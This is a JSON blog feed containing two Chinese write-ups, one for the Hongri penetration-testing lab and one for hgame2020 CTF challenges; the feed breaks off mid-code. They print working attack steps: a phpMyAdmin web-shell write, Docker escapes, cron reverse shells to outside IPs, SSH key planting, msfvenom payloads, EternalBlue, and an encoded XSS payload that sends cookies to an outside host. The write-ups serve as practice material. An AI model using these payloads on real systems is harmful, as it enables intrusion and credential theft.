{
    "version": "https://jsonfeed.org/version/1",
    "title": "M1N's Blog • All posts by \"writeup\" category",
    "description": "M1N的博客",
    "home_page_url": "http://blog.m1n.me",
    "items": [
        {
            "id": "http://blog.m1n.me/2021/09/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B%E7%AC%94%E8%AE%B0/",
            "url": "http://blog.m1n.me/2021/09/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B%E7%AC%94%E8%AE%B0/",
            "title": "红日靶场(四)笔记",
            "date_published": "2021-09-20T15:49:36.000Z",
            "content_html": "<h1 id=\"红日靶场四笔记\"><a class=\"markdownIt-Anchor\" href=\"#红日靶场四笔记\">#</a> 红日靶场 (四) 笔记</h1>\n<h2 id=\"外网打点\"><a class=\"markdownIt-Anchor\" href=\"#外网打点\">#</a> 外网打点</h2>\n<h3 id=\"2001端口struct2\"><a class=\"markdownIt-Anchor\" href=\"#2001端口struct2\">#</a> 2001 端口 Struct2</h3>\n<p>Burp 抓包看到 Struct2 字样，直接工具测试一把梭</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170347.png\" alt=\"\" class=\"lazyload\"></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170720.png\" alt=\"\" class=\"lazyload\"></p>\n<h3 id=\"2002端口tomcat\"><a class=\"markdownIt-Anchor\" href=\"#2002端口tomcat\">#</a> 2002 端口 Tomcat</h3>\n<p>可以参考 https://www.freebuf.com/articles/web/271892.html</p>\n<p>使用 PUT 上传冰蝎马，注意直接上传 <code>/shell.jsp</code>  不行哦</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815180101.png\" alt=\"\" class=\"lazyload\"></p>\n<h3 id=\"2003端口phpmyadmin-481\"><a class=\"markdownIt-Anchor\" href=\"#2003端口phpmyadmin-481\">#</a> 2003 端口 phpMyAdmin 4.8.1</h3>\n<p>可以参考 https://www.dazhuanlan.com/oliiiflorrr/topics/1144804</p>\n<ol>\n<li>验证漏洞是否存在</li>\n</ol>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815181519.png\" alt=\"\" class=\"lazyload\"></p>\n<ol start=\"2\">\n<li>使用 SELECT 语句后包含 session 文件来 get shell，写 shell <code>SELECT &quot;&lt;?php phpinfo();file_put_contents('m1n.php', '&lt;?=@eval($_POST[1]);');?&gt;&quot;  </code> ，访问发现 <code>http://10.0.5.100:2003/index.php?target=db_sql.php?/../../../../../../../../../tmp/sess_a851fdf11a88214580de888e61ed1867</code>  出现 phpinfo，用蚁剑连接 m1n.php 即可。</li>\n</ol>\n<h2 id=\"docker逃逸2002端口的tomcat\"><a class=\"markdownIt-Anchor\" href=\"#docker逃逸2002端口的tomcat\">#</a> Docker 逃逸（2002 端口的 Tomcat）</h2>\n<h3 id=\"如何判断是否在docker里\"><a class=\"markdownIt-Anchor\" href=\"#如何判断是否在docker里\">#</a> 如何判断是否在 Docker 里</h3>\n<ul>\n<li>检查  <code>/.dockerenv</code>  文件是否存在</li>\n<li>检查  <code>/proc/1/cgroup</code>  内是否包含 Docker 等字符串</li>\n</ul>\n<h3 id=\"尝试dirtycow漏洞逃逸\"><a class=\"markdownIt-Anchor\" href=\"#尝试dirtycow漏洞逃逸\">#</a> 尝试 DirtyCow 漏洞逃逸</h3>\n<ol>\n<li>下载 POC：<a href=\"https://github.com/scumjr/dirtycow-vdso\">https://github.com/scumjr/dirtycow-vdso</a></li>\n<li>编译，上传，监听，运行，没反应，下一个。</li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">git clone https:<span class=\"hljs-regexp\">//gi</span>thub.com<span class=\"hljs-regexp\">/scumjr/</span>dirtycow-vdso.git<br>cd dirtycow-vdso<br>make<br>./<span class=\"hljs-number\">0</span>xdeadbeef ip:port<br></code></pre></td></tr></table></figure>\n<h3 id=\"尝试runc容器逃逸漏洞cve-2019-5736\"><a class=\"markdownIt-Anchor\" href=\"#尝试runc容器逃逸漏洞cve-2019-5736\">#</a> 尝试 runC 容器逃逸漏洞（CVE-2019-5736）</h3>\n<ol>\n<li>下载 POC：<a href=\"https://github.com/Frichetten/CVE-2019-5736-PoC\">https://github.com/Frichetten/CVE-2019-5736-PoC</a></li>\n<li>改 POC，把 payload 那行改成自己 VPS 的 IP</li>\n<li>编译（建议 Linux 环境下） <code>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</code></li>\n<li>上传文件，监听端口，执行，没反应，下一个。</li>\n</ol>\n<h3 id=\"尝试特权模式逃逸\"><a class=\"markdownIt-Anchor\" href=\"#尝试特权模式逃逸\">#</a> 尝试特权模式逃逸</h3>\n<ol>\n<li><code>fdisk -l</code>  查看磁盘</li>\n</ol>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816152320.png\" alt=\"\" class=\"lazyload\"></p>\n<ol start=\"2\">\n<li>\n<p>在根目录下创建文件夹，把 /dev/sda1 挂在到该文件夹</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">mkdir</span> /m<span class=\"hljs-number\">1</span>n<br><span class=\"hljs-attribute\">mount</span> /dev/sda<span class=\"hljs-number\">1</span> /m<span class=\"hljs-number\">1</span>n<br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>可以看到宿主机的文件都到了 /m1n 目录下</p>\n</li>\n</ol>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"C:%5CUsers%5CM1N%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210816152534150.png\" alt=\"image-20210816152534150\" class=\"lazyload\"></p>\n<h4 id=\"尝试写定时任务来反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#尝试写定时任务来反弹shell\">#</a> 尝试写定时任务来反弹 shell</h4>\n<p>参考：<a href=\"https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/\">https://m3lon.github.io/2019/03/18 / 解决 ubuntu-crontab 反弹 shell 失败的问题 /</a></p>\n<ol>\n<li>写文件到 <code>/var/spool/cron/crontabs/root</code> ，注意写到 <code>/var/spool/cron/root</code>  不行嗷</li>\n<li>同时注意 root 文件的权限必须为 600</li>\n<li>注意定时任务文件内容中，路径要用绝对路径，建议把命令写成 <code>.sh</code>  文件，然后 <code>chmod +x</code> ，然后调用，不容易出错</li>\n<li>也可以 <code>*/1 * * * *  bash -c &quot;bash -i  &gt;&amp;/dev/tcp/123.207.x.x/1234 0&gt;&amp;1&quot;</code></li>\n<li>在本地的 Ubuntu20 虚拟机中成功反弹 shell，但是靶场环境下没法成功，写入了定时任务必须 restart 才可以执行，否则不执行，无奈。</li>\n</ol>\n<p><strong>定时任务相关笔记：</strong></p>\n<ol>\n<li>\n<p>定时任务有时无法看到报错信息，可以这样获取报错信息</p>\n<p><code>\\* * * * * '/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1'&gt;/tmp/error.txt 2&gt;&amp;1</code></p>\n</li>\n<li>\n<p>定时任务查看日志：<a href=\"https://www.cnblogs.com/zhangshengxiang/p/11842326.html\">https://www.cnblogs.com/zhangshengxiang/p/11842326.html</a></p>\n<p>（1）查看系统日志直接： <code>tail -f /var/log/syslog</code></p>\n<p>（2）查看 crontab 日志：</p>\n<p>​\t方法 1</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-number\">1</span>. 修改rsyslog文件，将<span class=\"hljs-regexp\">/etc/</span>rsyslog.d/<span class=\"hljs-number\">50</span>-default.conf 文件中的<span class=\"hljs-comment\">#cron.*前的#删掉；</span><br><span class=\"hljs-number\">2</span>. 重启rsyslog服务service rsyslog restart<br><span class=\"hljs-number\">3</span>. 重启cron服务service cron restart<br></code></pre></td></tr></table></figure>\n<p>​\t方法 2</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-number\">1</span>. 编辑 <span class=\"hljs-regexp\">/etc/</span>syslog.conf，并且打开以cron.*开始的那行注释。<br><span class=\"hljs-number\">2</span>. 运行 <span class=\"hljs-regexp\">/etc/i</span>nit.d/sysklogd restart<br><span class=\"hljs-number\">3</span>. 运行 <span class=\"hljs-regexp\">/etc/i</span>nit.d/cron restart<br></code></pre></td></tr></table></figure>\n<p>​\t查看 cron 日志</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-number\">1</span>. linux<br>看 <span class=\"hljs-regexp\">/var/</span>log<span class=\"hljs-regexp\">/cron这个文件就可以，可以用tail -f /</span>var<span class=\"hljs-regexp\">/log/</span>cron观察（或者<span class=\"hljs-regexp\">/var/</span>log/cron.log）<br><br><span class=\"hljs-number\">2</span>. unix<br>在 <span class=\"hljs-regexp\">/var/</span>spool<span class=\"hljs-regexp\">/cron/</span>tmp文件中，有croutXXX001864的tmp文件，tail 这些文件就可以看到正在执行的任务了。<br><br><span class=\"hljs-number\">3</span>. mail任务<br>在 <span class=\"hljs-regexp\">/var/</span>spool<span class=\"hljs-regexp\">/mail/</span>root 文件中，有crontab执行日志的记录，用tail -f <span class=\"hljs-regexp\">/var/</span>spool<span class=\"hljs-regexp\">/mail/</span>root 即可查看最近的crontab执行情况<br></code></pre></td></tr></table></figure>\n</li>\n</ol>\n<h4 id=\"尝试写ssh公钥来连接\"><a class=\"markdownIt-Anchor\" href=\"#尝试写ssh公钥来连接\">#</a> 尝试写.ssh 公钥来连接</h4>\n<ol>\n<li>\n<p>本地生成公私钥</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">ssh</span>-keygen -f m<span class=\"hljs-number\">1</span>n<br><span class=\"hljs-attribute\">chmod</span> <span class=\"hljs-number\">600</span> m<span class=\"hljs-number\">1</span>n<br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>把 m1n.pub 文件上传到服务器的 <code>/root/.ssh/</code>  目录下（注意，是 /m1n 下的 /root/.ssh），没有这个目录就创建这个目录</p>\n</li>\n<li>\n<p>把 m1n.pub 的文件内容写到 authorized_keys 文件中 <code>cat m1n.pub &gt; authorized_keys</code></p>\n</li>\n<li>\n<p>然后 <code>ssh -i m1n root@ip</code>  连接，即可</p>\n</li>\n</ol>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816161055.png\" alt=\"\" class=\"lazyload\"></p>\n<ol start=\"5\">\n<li>踩坑笔记：不要写公钥到 <code>/home/ubuntu/.ssh/</code>  目录下，连不上。</li>\n</ol>\n<h2 id=\"内网渗透\"><a class=\"markdownIt-Anchor\" href=\"#内网渗透\">#</a> 内网渗透</h2>\n<h3 id=\"传\"><a class=\"markdownIt-Anchor\" href=\"#传\">#</a> 传🐎</h3>\n<h4 id=\"msf\"><a class=\"markdownIt-Anchor\" href=\"#msf\">#</a> MSF🐎</h4>\n<ol>\n<li>\n<p>生成 msf🐎</p>\n<p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.192.168.145 LPORT=4444 -f elf &gt; mshell.elf</code></p>\n</li>\n<li>\n<p>把🐎儿传到目标机子上面</p>\n</li>\n<li>\n<p>攻击机执行以下</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs routeros\">use exploit/multi/handler<br><span class=\"hljs-builtin-name\">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class=\"hljs-builtin-name\">set</span> lhost 10.192.168.145<br><span class=\"hljs-builtin-name\">set</span> lport 4444<br>run<br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>目标机器添加权限后执行 mshell.elf</p>\n</li>\n<li>\n<p>kali 接收到 shell</p>\n</li>\n</ol>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108261512059.png\" alt=\"\" class=\"lazyload\"></p>\n<ol start=\"5\">\n<li>\n<p>msf 拿到 shell 后，需要导入路由，使用 msf6 的自动路由导入</p>\n<figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stata\">background<br><br><span class=\"hljs-keyword\">use</span> <span class=\"hljs-keyword\">post</span>/multi/manage/autoroute<br><br><span class=\"hljs-keyword\">set</span> session x<br><br><span class=\"hljs-keyword\">run</span><br></code></pre></td></tr></table></figure>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271034464.png\" alt=\"\" class=\"lazyload\"></p>\n</li>\n</ol>\n<h3 id=\"代理转发\"><a class=\"markdownIt-Anchor\" href=\"#代理转发\">#</a> 代理转发</h3>\n<h4 id=\"使用ew代理转发\"><a class=\"markdownIt-Anchor\" href=\"#使用ew代理转发\">#</a> 使用 ew 代理转发</h4>\n<ol>\n<li>上传 ew_for_linux64</li>\n<li>执行 <code>./ew -s ssocksd -l 8888</code></li>\n<li>更改 kali 的 /etc/proxychains4.conf 文件，添加 socks5 ip prot</li>\n<li>在需要代理时，执行命令如 <code>proxychains4 curl http://127.0.0.1:2003/</code>  即可</li>\n</ol>\n<h3 id=\"ubuntu信息收集\"><a class=\"markdownIt-Anchor\" href=\"#ubuntu信息收集\">#</a> Ubuntu 信息收集</h3>\n<ol>\n<li>\n<p>从路由表可以看到有几个网段，有个 183 网段应该就是内网网段了</p>\n</li>\n<li>\n<p>msf 进行一波存活扫描</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">use</span> auxiliary/scanner/discovery/udp_probeset rhosts <span class=\"hljs-number\">192.168.183.0</span>-<span class=\"hljs-number\">255</span>set threads <span class=\"hljs-number\">5</span>run<br></code></pre></td></tr></table></figure>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271043598.png\" alt=\"\" class=\"lazyload\"></p>\n<p>可以看到有 128、130 两台机子。</p>\n</li>\n<li>\n<p>扫一下 ms17-010</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">use</span> auxiliary/scanner/smb/smb_ms<span class=\"hljs-number\">17</span>_<span class=\"hljs-number\">010</span>set rhosts <span class=\"hljs-number\">192.168.183.128</span>-<span class=\"hljs-number\">130</span>run<br></code></pre></td></tr></table></figure>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271046846.png\" alt=\"\" class=\"lazyload\"></p>\n<p>可以看到 128 的 win7 和 130 的 winserver2008 都可能存在永恒之蓝。</p>\n</li>\n<li>\n<p>尝试打永恒之蓝，测试发现 128 的 win7 能打通，130 的 winserver2008 打不通。</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">setg Proxies socks5:<span class=\"hljs-number\">10.0</span>.<span class=\"hljs-number\">5.100</span>:<span class=\"hljs-number\">8888</span>\t\t\t\t\t<span class=\"hljs-regexp\">//</span>MSF走ew的代理set ReverseAllowProxy true\t\t\t\t\t\t\t<span class=\"hljs-regexp\">//</span>开启反向代理use exploit<span class=\"hljs-regexp\">/windows/</span>smb<span class=\"hljs-regexp\">/ms17_010_eternalblueset payload windows/</span>x64<span class=\"hljs-regexp\">/meterpreter/</span>bind_tcpset rhost <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.128</span>set lport <span class=\"hljs-number\">4444</span>set AutoRunScript post<span class=\"hljs-regexp\">/windows/m</span>anage<span class=\"hljs-regexp\">/migrate       /</span><span class=\"hljs-regexp\">/自动迁移进程run</span><br></code></pre></td></tr></table></figure>\n<p>成功拿下 shell</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271535393.png\" alt=\"\" class=\"lazyload\"></p>\n</li>\n</ol>\n<h3 id=\"win7权限维持\"><a class=\"markdownIt-Anchor\" href=\"#win7权限维持\">#</a> Win7 权限维持</h3>\n<ol>\n<li>虽然拿到了 shell，但是在使用过程中发现这个 shell 经常掉线，只能想办法弄个稳定点的 shell</li>\n<li></li>\n</ol>\n<h3 id=\"win7信息收集\"><a class=\"markdownIt-Anchor\" href=\"#win7信息收集\">#</a> Win7 信息收集</h3>\n<ol>\n<li><code>route print</code></li>\n</ol>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737582.png\" alt=\"\" class=\"lazyload\"></p>\n<ol start=\"2\">\n<li><code>net user /domain</code></li>\n</ol>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737928.png\" alt=\"\" class=\"lazyload\"></p>\n<ol start=\"3\">\n<li><code>net user</code></li>\n</ol>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071745632.png\" alt=\"\" class=\"lazyload\"></p>\n<ol start=\"4\">\n<li><code>net view</code></li>\n</ol>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071742103.png\" alt=\"\" class=\"lazyload\"></p>\n<ol start=\"5\">\n<li><code>ping WIN-ENS2VR5TR3N</code></li>\n</ol>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071744532.png\" alt=\"\" class=\"lazyload\"></p>\n",
            "tags": []
        },
        {
            "id": "http://blog.m1n.me/2020/02/05/hgame2020/",
            "url": "http://blog.m1n.me/2020/02/05/hgame2020/",
            "title": "hgame2020",
            "date_published": "2020-02-05T15:09:06.000Z",
            "content_html": "<p><a href=\"https://hgame.vidar.club/#/challenge/list\">https://hgame.vidar.club/#/challenge/list</a></p>\n<span id=\"more\"></span>\n<h1 id=\"week1\"><a class=\"markdownIt-Anchor\" href=\"#week1\">#</a> week1</h1>\n<h2 id=\"cosmos的博客\"><a class=\"markdownIt-Anchor\" href=\"#cosmos的博客\">#</a> Cosmos 的博客</h2>\n<p>刚开始拿到题目提示说 git 源码泄露，就用 githack 把源码扫了下来，但是看了半天没有什么东西，后来看了 WP 才知道直接去 git 上找历史提交记录，emmmmm</p>\n<h2 id=\"接头霸王\"><a class=\"markdownIt-Anchor\" href=\"#接头霸王\">#</a> 接头霸王</h2>\n<p>考察知识点</p>\n<ol>\n<li>referer</li>\n<li>X-Forwarded-For</li>\n<li>UA</li>\n<li>请求方式</li>\n<li>最后一个也是之前没见过的时间，If-Unmodified-Since，格式 If-Unmodified-Since:Tue, 26 Jan 2064 00:00:00 GMT</li>\n</ol>\n<h2 id=\"code-world\"><a class=\"markdownIt-Anchor\" href=\"#code-world\">#</a> Code World</h2>\n<p>访问发现 403，查看源代码发现提示 302 跳转，就直接访问 index.php 并且抓包改一下请求方式，然后提示令 a=10，题目又提示 a=b+c，就用 payload?a=1+9, 但是还要 url 编码一下，不然 + 会变成空格</p>\n<h2 id=\"鸡尼泰玫\"><a class=\"markdownIt-Anchor\" href=\"#鸡尼泰玫\">#</a> 鸡尼泰玫</h2>\n<p>提示分数要 60000 以上，抓包改一下就好了</p>\n<h1 id=\"week2\"><a class=\"markdownIt-Anchor\" href=\"#week2\">#</a> week2</h1>\n<h2 id=\"cosmos博客的后台\"><a class=\"markdownIt-Anchor\" href=\"#cosmos博客的后台\">#</a> Cosmos 博客的后台</h2>\n<p>访问看到登陆界面，刚开始以为是 sql 注入，弄半天不行，忘记了提示只用了 HTML 和 PHP，然后直接访问发现有？action=login.php，应该可以用 php 为协议读源码，因此拿到了 login.php 和 admin.php 的源码<br>\n在 login.php 中发现 debug 可以读取任意变量，读取一下 username 和 password 然后 $admin_password 又是固定的，读取发现是 oe 开头的（保存一个 0e 开头的 MD5 值和原值以便不时之需 s878926199a/<br>\n0e545993274517709034328855841020），这样就可以突破登陆，就来到了 admin.php 页面，读源码发现用 CSRF 和 file 伪协议拿到 flag，payload：file://localhost/flag</p>\n<h2 id=\"cosmos的留言板-1\"><a class=\"markdownIt-Anchor\" href=\"#cosmos的留言板-1\">#</a> Cosmos 的留言板 - 1</h2>\n<p>用单引号闭合回显不一样，存在 sql<br>\n 注入点，发现过滤了空格还有 select，空格可以用 /**/ 绕过，select 可以双写绕过。但是这里的 #要 url 编码成 %23，不然过不去 ，一直卡在这里，然后就是熟悉的拿 flag 环节</p>\n<h2 id=\"cosmos的新语言\"><a class=\"markdownIt-Anchor\" href=\"#cosmos的新语言\">#</a> Cosmos 的新语言</h2>\n<p>访问 mycode 拿到源码，就是一层又一层的加密，，按照加密步骤解密就好了。由于 token 会实时刷新，这里用 py 脚本跑一下就好了</p>\n<h2 id=\"cosmos的聊天室\"><a class=\"markdownIt-Anchor\" href=\"#cosmos的聊天室\">#</a> Cosmos 的聊天室</h2>\n<p>提示必须管理员的 token 才能拿 flag，结合题目看应该是考察 XSS 拿 cookie。然后开始测试过滤，发现过滤了 &lt;，但是可以通过 HTML 实体编码绕过，构造 payload，（这里放一个拿 cookie 并且登陆的总结文章 https://blog.csdn.net/lhh134/article/details/86477305 以便日后忘记）<br>\n然后用 payload： <code>&lt;svg/onload=&quot;&amp;#x77;&amp;#x69;&amp;#x6e;&amp;#x64;&amp;#x6f;&amp;#x77;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x2e;&amp;#x68;&amp;#x72;&amp;#x65;&amp;#x66;&amp;#x3d;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x34;&amp;#x37;&amp;#x2e;&amp;#x39;&amp;#x36;&amp;#x2e;&amp;#x32;&amp;#x33;&amp;#x33;&amp;#x2e;&amp;#x32;&amp;#x31;&amp;#x36;&amp;#x2f;&amp;#x3f;&amp;#x73;&amp;#x3d;&amp;#x22;&amp;#x2b;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6f;&amp;#x6b;&amp;#x69;&amp;#x65;&amp;#x3b;&quot;</code>  拿到了 token<br>\n/?token=f802788a02a51f9c624bb5d91815b，访问 flag 页面，改一下 token 就拿到了 flag</p>\n<h1 id=\"week3\"><a class=\"markdownIt-Anchor\" href=\"#week3\">#</a> week3</h1>\n<h2 id=\"序列之争-ordinal-scale\"><a class=\"markdownIt-Anchor\" href=\"#序列之争-ordinal-scale\">#</a> 序列之争 - Ordinal Scale</h2>\n<p>先查看源代码发现 source.zip，拿到源码，初步看一下应该是 PHP 反序列化的题目，先看一下 game.php 发现</p>\n<figure class=\"highlight php-template\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php-template\"><span class=\"php\"><span class=\"hljs-meta\">&lt;?php</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$game</span>-&gt;rank-&gt;Get() === <span class=\"hljs-number\">1</span>)&#123;<span class=\"hljs-meta\">?&gt;</span></span><span class=\"xml\"></span><br><span class=\"xml\">        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">h2</span>&gt;</span>hgame&#123;flag_is_here&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">h2</span>&gt;</span></span><br><span class=\"xml\">    </span><span class=\"php\"><span class=\"hljs-meta\">&lt;?php</span> &#125;<span class=\"hljs-meta\">?&gt;</span></span><br></code></pre></td></tr></table></figure>\n<p>于是找一下 game 类，其中 rank 在__construct 方法中，新建的 Rank 类，而 Rank 类中的 rank 由__construct 方法创建，来自 session 或者直接随机，也就是说可以让 rank=1，但是发现有__destruct 方法来判断 Rank 类是不是服务器定义的，但是这里可以利用 construct 函数定义this->key = &this-&gt;severKey 来绕过，接下来就是找反序列化的点，发现在 Monster 类中存在反序列化的点，但是是通过 cookie 的方式传入的，也就是说我们要想办法构造符合的 cookie 来将 payload 传入，这里就需要知道 encryptKey 是多少，而 encryptKey 是由参数传入的：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-variable\">$data</span> = [<span class=\"hljs-variable\">$playerName</span>, <span class=\"hljs-keyword\">$this</span>-&gt;encryptKey];<br><br><span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">init</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$data</span></span>)</span>&#123;<br>        <span class=\"hljs-keyword\">foreach</span>(<span class=\"hljs-variable\">$data</span> <span class=\"hljs-keyword\">as</span> <span class=\"hljs-variable\">$key</span> =&gt; <span class=\"hljs-variable\">$value</span>)&#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;welcomeMsg = sprintf(<span class=\"hljs-keyword\">$this</span>-&gt;welcomeMsg, <span class=\"hljs-variable\">$value</span>);<br>            <span class=\"hljs-keyword\">$this</span>-&gt;sign .= md5(<span class=\"hljs-keyword\">$this</span>-&gt;sign . <span class=\"hljs-variable\">$value</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>\n<p>其中 foreach 用法：<br>\n<img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/1.png\" alt=\"1\" class=\"lazyload\"><br>\n 以及 sprintf 用法：<br>\n<img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/2.png\" alt=\"2\" class=\"lazyload\"><br>\n 也就是说我们可以通过将 playername 赋值为 % s 就可以循环的将第二个值输出，拿到 encryptKey。<br>\nexp：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span 